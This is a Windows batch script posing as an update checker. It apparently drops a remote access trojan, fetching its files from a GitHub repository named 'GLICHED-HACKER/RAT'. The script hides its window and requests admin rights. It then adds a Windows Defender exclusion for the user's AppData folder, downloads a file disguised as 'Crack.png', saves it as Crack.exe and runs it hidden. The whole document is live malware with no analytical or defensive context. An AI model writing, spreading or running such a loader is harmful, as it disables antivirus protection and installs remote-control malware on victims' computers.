@echo off
SETLOCAL

:: Check if the script is already running in minimized mode
:: If not, re-launch itself in a minimized window and exit the current instance.
if not "%~1"=="minimized" (
    start /min "" "%~f0" minimized
    exit /b
)

SET "APPDATA_ROOT_PATH=%USERPROFILE%\AppData"
SET "LOCAL_FILE=%APPDATA_ROOT_PATH%\Roaming\Windows\update.txt"
SET "UPDATE_CHECK_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/refs/heads/main/UpdateChecks"
SET "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
SET "PROCESS_TO_KILL_NAME=WinSystem32.exe"
SET "TARGET_FILE=%APPDATA_ROOT_PATH%\Crack.exe"

:: Step 0: Wait for internet connection
:CheckInternet
ping -n 1 8.8.8.8 >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    goto CheckInternet
)

:: Step 1: Check if update is needed (no admin needed for this initial check)
:: This PowerShell command compares the local file content with the content from UPDATE_CHECK_URL.
:: It exits with code 1 if an update is needed, or 0 if the file is already up to date.
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$localFilePath = '%LOCAL_FILE%'; $updateCheckUrl = '%UPDATE_CHECK_URL%'; try { $remoteContent = (Invoke-WebRequest -Uri $updateCheckUrl -UseBasicParsing).Content; $localContent = if (Test-Path $localFilePath) { Get-Content $localFilePath -Raw } else { '' }; if ($localContent -ne $remoteContent) { exit 1 } else { exit 0 }; } catch { exit 0; }"
if %errorlevel% NEQ 1 (
    exit /b
)

:: Step 2: Update needed - now check for admin privileges
:: If we reach this point, it means an update is required.
:: This checks if the script is currently running as administrator.
net session >nul 2>&1
if errorlevel 1 (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: Step 3: Admin privileges obtained, proceed with update actions
:: Each action is now a separate command for better modularity.

:: 3.1: Update the local version file
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%UPDATE_CHECK_URL%' -OutFile '%LOCAL_FILE%' -UseBasicParsing | Out-Null; } catch { }"

:: 3.2: Kill the specified process by name
taskkill /F /IM "%PROCESS_TO_KILL_NAME%" >nul 2>&1

:: 3.3: Add exclusion to Windows Defender for the AppData root path
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%APPDATA_ROOT_PATH%' -ErrorAction SilentlyContinue | Out-Null; } catch { }"

:: 3.4: Download the new file
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { (New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%'); } catch { }"

:: 3.5: Run the downloaded file
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { if (Test-Path '%TARGET_FILE%') { Start-Process -FilePath '%TARGET_FILE%' -WindowStyle Hidden; }; } catch { }"

ENDLOCAL
